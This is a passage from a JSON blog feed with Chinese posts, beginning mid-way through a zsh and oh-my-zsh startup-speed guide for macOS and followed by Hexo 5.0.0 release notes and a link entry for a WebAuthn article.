zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\">\n<div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-08-10</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">Hexo 5.0.0 正式发布</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-07-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]